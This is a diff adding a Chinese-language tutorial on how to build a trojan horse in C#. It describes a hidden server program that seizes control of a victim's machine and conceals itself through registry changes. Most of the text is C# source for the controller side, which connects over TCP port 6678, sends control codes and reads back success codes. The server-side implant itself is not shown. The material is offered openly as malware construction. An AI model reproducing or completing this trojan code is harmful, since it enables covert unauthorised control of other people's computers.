@@ -1,0 +1,136 @@
+木马的介绍
+
+　　因为本文是探讨木马程序，所以在介绍之前有一些木马构成的基本知识事先说明。一个完整的木马系统由硬件部分，软件部分和具体连接部分组成。这里主要对软件部分介绍，它主要有控制端程序、木马程序（后台服务程序）、木马配制程序组成。控制端用以远程控制服务端的程序；木马程序是潜入服务端内部，获取其操作权限的程序；木马配制程序是设置木马程序的端口号，触发条件，木马名称等，使其在服务端藏的更隐蔽的程序。
+
+　　使用的技术：
+
+　　控制端程序发送控制码控制服务器，服务器后台运行，修改注册表达到控制的目的。技术不是很难的，主要体现C#的网络编程和注册表的修改。
+
+　　控制端开发：
+
+　　控制端向服务器发出一段控制码，服务端（木马程序）收到控制码后，根据控制的要求，完成指定的要求，如果服务器完成工作，返回成功的信息。
+
+　　控制端的开发：
+
+　　控制码的设定你可以自已设定，不需要详解，主要有以下几个难点。
+
+　　1、连接请求
+
+使用了.NET类中的 System.Net.Sockets.TcpClient类,
+TcpClient(string hostname,int port) 
+Hostname 是要控制的主机名称，当然你也可以用IP地址。
+Port是端口。
+// System.EventArgs包含事件数据类的基类
+private void button7_Click(object sender, System.EventArgs e)
+{ 
+//记录操作,在richTextBox控件中增加操作信息
+richTextBox1.AppendText("请求连接" +textBox1.Text +"\r");
+int port =6678;
+try 
+{
+//初始化 TcpClient 类的新实例并连接到指定主机上的指定端口
+client = new TcpClient(textBox1.Text,port);
+}
+catch 
+{
+MessageBox.Show("服务器不在线!确定是否输入主机名称.");
+richTextBox1.AppendText("服务器不在线!确定是否输入主机名称.");
+}
+}//private void buttion 
+
+　　2、测试是否与被控制机连接上。程序的流程是发送控制码看控制端是否有反应，如果有返回则显示控制成功。 //提供网络访问的数据流 
+
+
+//private NetworkStream stream;
+代码如下：
+private void button8_Click(object sender, System.EventArgs e)
+{
+//纪录操作
+richTextBox1.AppendText("测试连接" +"\r");
+try
+{
+
+stream = client.GetStream();
+if(stream.CanWrite)
+{
+//发送控制码
+string control = "jiance";
+byte[] by =System.Text.Encoding.ASCII.GetBytes(control.ToCharArray());
+stream.Write(by,0,by.Length);
+//下次使用
+stream.Flush();
+//启动接收反回数据的线程
+//receive是线程执行的函数，见后面的分析
+threadReceive = new Thread(new ThreadStart(receive));
+threadReceive.Start();
+}
+}
+catch(Exception ee)
+{
+richTextBox1.AppendText (ee.Message+"\r");
+MessageBox.Show(ee.Message);
+}
+} 
+
+　　3、控制生效的代码
+
+private void button9_Click(object sender, System.EventArgs e)
+{
+//这里是确定要发送的控制码，RadioButton是窗体控件
+if(radioButton1.Checked){ control = form2.zhucex;}
+else if(radioButton2.Checked){ control =form3.zhuces;}
+else if(radioButton3.Checked){ control = warring;}
+else if(radioButton4.Checked){ control =suggest;}
+else if(radioButton5.Checked){ control =form4.mumawe;}
+else if(radioButton6.Checked){ control =drop;}
+if (control =="000000")
+{
+MessageBox.Show("你没有输入任何控制目标!不发控制信号");
+richTextBox1.AppendText("你没有输入任何控制目标!不发控制信号");
+}
+else if(control != "000000")
+{
+try
+{
+//记录操作
+richTextBox1.AppendText (control + "正在试图控制,等待回应......" + "\r");
+stream = client.GetStream();
+if(stream.CanWrite )
+{
+byte[] by = System.Text.Encoding.ASCII.GetBytes(control.ToCharArray ());
+stream.Write(by,0,by.Length);
+stream.Flush();
+threadReceive =new Thread(new ThreadStart(receive));
+threadReceive.Start();
+}//endif
+}//try
+catch
+{
+richTextBox1.AppendText("服务器未连接1控制无效!" +"\r");
+MessageBox.Show("服务器未连接1控制无效!" +"\r");
+}
+}//else if
+} 
+
+　　4、线程执行的函数
+
+private void receive()
+{
+//设置读取数据的空间
+byte[] bb = new byte[3];
+//读取3个字节,i为实际读取的字节数
+int i = stream.Read(bb,0,3);
+//转换成字符串，如果是中文控制码则用string ss = //System.Text.Encoding.Unicode.GetString(bb);
+string ss = System.Text.Encoding.ASCII.GetString(bb);
+//hjc为我设置的服务器的返回码 hjc为连接成功，hkz为控制成功
+if(ss=="hjc")
+{
+MessageBox.Show("连接成功");
+richTextBox1.AppendText("连接成功");
+}
+if(ss== "hkz")
+{
+richTextBox1.AppendText(control +"控制成功"+"\r");
+MessageBox.Show(control +"控制成功"+"\r");
+}
+} 
